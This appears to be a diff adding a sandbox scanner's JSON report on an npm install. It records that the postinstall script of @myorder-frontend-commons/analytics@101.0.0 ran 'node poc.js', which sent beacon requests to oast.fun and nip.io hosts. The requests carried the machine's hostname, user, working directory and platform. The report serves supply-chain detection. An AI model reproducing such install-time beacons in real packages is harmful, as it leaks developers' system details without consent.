@@ -1,0 +1,148 @@
+{
+  "provider": "vercel-sandbox",
+  "sandboxId": "cyan-proper-catfish-UbyT65",
+  "marker": "AIRLOCK-DECOY-4788409cf799e47b343da847",
+  "allowedHosts": [
+    "registry.npmjs.org",
+    "registry.yarnpkg.com",
+    "pypi.org",
+    "files.pythonhosted.org"
+  ],
+  "steps": [
+    {
+      "label": "npm install",
+      "command": "npm install --foreground-scripts --no-audit --no-fund --loglevel=error",
+      "why": "Installing runs the install scripts of the project and of every package it depends on.",
+      "exitCode": 0,
+      "timedOut": false,
+      "seconds": 4,
+      "scripts": {
+        "node poc.js": "@myorder-frontend-commons/analytics@101.0.0 postinstall script"
+      },
+      "trace": {
+        "wallets": [],
+        "contacts": [
+          {
+            "host": "65373233626439362d6632627c6465767c3130312e302e30.db69ak0hu4nqhtf9omnguspxhjk8kuide.oast.fun",
+            "by": "node poc.js"
+          },
+          {
+            "host": "80-190-83-27.nip.io",
+            "by": "node poc.js"
+          }
+        ],
+        "programs": [
+          "sh -c node poc.js",
+          "node poc.js"
+        ]
+      }
+    }
+  ],
+  "wallets": [],
+  "contacts": [
+    {
+      "host": "65373233626439362d6632627c6465767c3130312e302e30.db69ak0hu4nqhtf9omnguspxhjk8kuide.oast.fun",
+      "by": "node poc.js (@myorder-frontend-commons/analytics@101.0.0 postinstall script)",
+      "step": "npm install"
+    },
+    {
+      "host": "80-190-83-27.nip.io",
+      "by": "node poc.js (@myorder-frontend-commons/analytics@101.0.0 postinstall script)",
+      "step": "npm install"
+    }
+  ],
+  "programs": [
+    {
+      "command": "sh -c node poc.js",
+      "step": "npm install"
+    },
+    {
+      "command": "node poc.js",
+      "step": "npm install"
+    }
+  ],
+  "capture": {
+    "on": true
+  },
+  "exfil": [
+    {
+      "host": "65373233626439362d6632627c6465767c3130312e302e30.db69ak0hu4nqhtf9omnguspxhjk8kuide.oast.fun",
+      "method": "GET",
+      "path": "/beacon/594c7180-55fb-48e0-9aa5-32c1278fed3e?poc=594c7180-55fb-48e0-9aa5-32c1278fed3e&trigger=preinstall&pkg=%40myorder-frontend-commons%2Fanalytics&pkgVersion=101.0.0&hostname=e723bd96-f2b&user=dev&platform=linux-x64-6.18.56&cwd=%2Fhome%2Fdev%2Fcode%2Fproject&node=v24.22.3&ci=CI",
+      "tls": false,
+      "bytes": 0,
+      "contentType": null,
+      "decoys": [],
+      "by": "node poc.js (@myorder-frontend-commons/analytics@101.0.0 postinstall script)",
+      "step": "npm install",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "sample": ""
+    },
+    {
+      "host": "80-190-83-27.nip.io",
+      "method": "GET",
+      "path": "/beacon/594c7180-55fb-48e0-9aa5-32c1278fed3e?poc=594c7180-55fb-48e0-9aa5-32c1278fed3e&trigger=preinstall&pkg=%40myorder-frontend-commons%2Fanalytics&pkgVersion=101.0.0&hostname=e723bd96-f2b&user=dev&platform=linux-x64-6.18.56&cwd=%2Fhome%2Fdev%2Fcode%2Fproject&node=v24.22.3&ci=CI",
+      "tls": false,
+      "bytes": 0,
+      "contentType": null,
+      "decoys": [],
+      "by": "node poc.js (@myorder-frontend-commons/analytics@101.0.0 postinstall script)",
+      "step": "npm install",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "sample": ""
+    },
+    {
+      "host": "65373233626439362d6632627c6465767c3130312e302e30.db69ak0hu4nqhtf9omnguspxhjk8kuide.oast.fun",
+      "method": "GET",
+      "path": "/beacon/594c7180-55fb-48e0-9aa5-32c1278fed3e?poc=594c7180-55fb-48e0-9aa5-32c1278fed3e&trigger=install&pkg=%40myorder-frontend-commons%2Fanalytics&pkgVersion=101.0.0&hostname=e723bd96-f2b&user=dev&platform=linux-x64-6.18.56&cwd=%2Fhome%2Fdev%2Fcode%2Fproject&node=v24.22.3&ci=CI",
+      "tls": false,
+      "bytes": 0,
+      "contentType": null,
+      "decoys": [],
+      "by": "node poc.js (@myorder-frontend-commons/analytics@101.0.0 postinstall script)",
+      "step": "npm install",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "sample": ""
+    },
+    {
+      "host": "80-190-83-27.nip.io",
+      "method": "GET",
+      "path": "/beacon/594c7180-55fb-48e0-9aa5-32c1278fed3e?poc=594c7180-55fb-48e0-9aa5-32c1278fed3e&trigger=install&pkg=%40myorder-frontend-commons%2Fanalytics&pkgVersion=101.0.0&hostname=e723bd96-f2b&user=dev&platform=linux-x64-6.18.56&cwd=%2Fhome%2Fdev%2Fcode%2Fproject&node=v24.22.3&ci=CI",
+      "tls": false,
+      "bytes": 0,
+      "contentType": null,
+      "decoys": [],
+      "by": "node poc.js (@myorder-frontend-commons/analytics@101.0.0 postinstall script)",
+      "step": "npm install",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "sample": ""
+    },
+    {
+      "host": "65373233626439362d6632627c6465767c3130312e302e30.db69ak0hu4nqhtf9omnguspxhjk8kuide.oast.fun",
+      "method": "GET",
+      "path": "/beacon/594c7180-55fb-48e0-9aa5-32c1278fed3e?poc=594c7180-55fb-48e0-9aa5-32c1278fed3e&trigger=postinstall&pkg=%40myorder-frontend-commons%2Fanalytics&pkgVersion=101.0.0&hostname=e723bd96-f2b&user=dev&platform=linux-x64-6.18.56&cwd=%2Fhome%2Fdev%2Fcode%2Fproject&node=v24.22.3&ci=CI",
+      "tls": false,
+      "bytes": 0,
+      "contentType": null,
+      "decoys": [],
+      "by": "node poc.js (@myorder-frontend-commons/analytics@101.0.0 postinstall script)",
+      "step": "npm install",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "sample": ""
+    },
+    {
+      "host": "80-190-83-27.nip.io",
+      "method": "GET",
+      "path": "/beacon/594c7180-55fb-48e0-9aa5-32c1278fed3e?poc=594c7180-55fb-48e0-9aa5-32c1278fed3e&trigger=postinstall&pkg=%40myorder-frontend-commons%2Fanalytics&pkgVersion=101.0.0&hostname=e723bd96-f2b&user=dev&platform=linux-x64-6.18.56&cwd=%2Fhome%2Fdev%2Fcode%2Fproject&node=v24.22.3&ci=CI",
+      "tls": false,
+      "bytes": 0,
+      "contentType": null,
+      "decoys": [],
+      "by": "node poc.js (@myorder-frontend-commons/analytics@101.0.0 postinstall script)",
+      "step": "npm install",
+      "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+      "sample": ""
+    }
+  ],
+  "refused": []
+}
